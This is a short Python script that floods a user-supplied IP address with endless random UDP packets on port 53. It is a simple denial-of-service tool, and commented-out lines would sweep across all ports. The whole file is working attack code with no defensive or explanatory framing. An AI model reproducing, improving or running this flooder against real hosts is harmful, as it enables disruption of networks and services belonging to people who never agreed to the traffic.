import socket
import random
import sys
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(8)
try:
    ip = sys.argv[1]
except:
    ip = input("IP Target: ")
port = 53
while True:
    sock.sendto(bytes, (ip, port))
    # port += 1
    # if port == 65534:
    #     port = 1
